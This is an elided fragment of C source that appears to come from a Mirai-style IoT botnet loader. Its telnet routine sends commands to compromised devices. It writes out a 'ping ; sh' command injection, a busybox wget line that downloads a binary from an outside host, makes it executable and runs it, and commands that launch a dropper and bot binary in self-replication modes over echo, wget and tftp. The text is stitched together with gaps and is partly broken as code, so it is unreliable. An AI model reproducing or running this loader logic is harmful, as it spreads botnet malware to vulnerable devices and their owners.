...
//                            util_sockprintf(conn->fd, "ping ; sh\r\n");
                        ...
                        if(consumed)
                        {
                            ...
                            switch(conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/13747243572475/h%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                    ...
                    case TELNET_UPLOAD_ECHO:
                        ...
                        if(consumed)
                        {
                            ...
                            if(strncmp(conn->info.arch, "arc", 3) == 0)
                                util_sockprintf(conn->fd, "./%s;./%s selfrep.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, conn->info.arch);
                            else
                                util_sockprintf(conn->fd, "./%s;./%s selfrep.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, conn->info.arch);
                    ...
                    case TELNET_UPLOAD_WGET:
                        ...
                        if(consumed > 0)
                        {
                            ...
                            #endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " selfrep.wget; " EXEC_QUERY "\r\n", conn->info.arch);
            ...
            case TELNET_UPLOAD_TFTP:
                        ...
                        if(consumed > 0)
                        {
                            ...
                            #endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " selfrep.tftp; " EXEC_QUERY "\r\n", conn->info.arch);
